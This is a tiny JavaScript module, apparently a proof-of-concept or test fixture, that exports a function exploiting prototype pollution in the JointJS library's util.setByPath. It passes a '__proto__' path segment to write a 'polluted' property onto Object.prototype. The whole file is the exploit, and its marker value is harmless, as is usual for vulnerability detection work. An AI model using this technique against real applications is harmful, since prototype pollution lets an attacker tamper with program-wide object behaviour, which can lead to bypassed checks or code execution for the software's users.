function exploitFunction(jointjs) {
    jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");
}

module.exports = { exploitFunction };